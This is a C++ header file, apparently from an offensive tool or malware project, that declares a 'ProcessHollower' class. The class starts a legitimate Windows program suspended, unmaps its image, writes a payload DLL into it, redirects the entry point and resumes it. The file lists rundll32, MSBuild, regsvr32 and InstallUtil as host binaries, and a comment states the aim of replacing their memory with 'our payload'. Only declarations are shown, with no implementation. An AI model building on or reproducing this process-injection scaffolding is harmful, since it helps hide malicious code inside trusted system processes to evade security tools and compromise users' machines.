#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <optional>

namespace l4g::injection {

struct HollowResult {
    bool success = false;
    HANDLE process_handle = nullptr;
    HANDLE thread_handle = nullptr;
    DWORD process_id = 0;
    DWORD thread_id = 0;
    void* base_address = nullptr;
    std::string error;
};

class ProcessHollower {
public:
    // Create suspended legitimate process and replace its memory with our payload
    static HollowResult hollow_and_inject(const std::wstring& target_exe, const std::vector<uint8_t>& payload_dll, void* param = nullptr);
    
    // Supported legitimate loaders
    static constexpr const wchar_t* RUN_DLL32 = L"C:\\Windows\\System32\\rundll32.exe";
    static constexpr const wchar_t* MSBUILD = L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe";
    static constexpr const wchar_t* REGSVR32 = L"C:\\Windows\\System32\\regsvr32.exe";
    static constexpr const wchar_t* INSTALLUTIL = L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe";
    
private:
    static bool create_suspended_process(const std::wstring& exe_path, PROCESS_INFORMATION& pi);
    static bool unmap_original_image(HANDLE process);
    static bool write_payload(HANDLE process, const std::vector<uint8_t>& payload, void*& out_base);
    static bool fix_entry_point(HANDLE process, void* base, const std::vector<uint8_t>& payload);
    static bool resume_thread(HANDLE thread);
};

} // namespace l4g::injection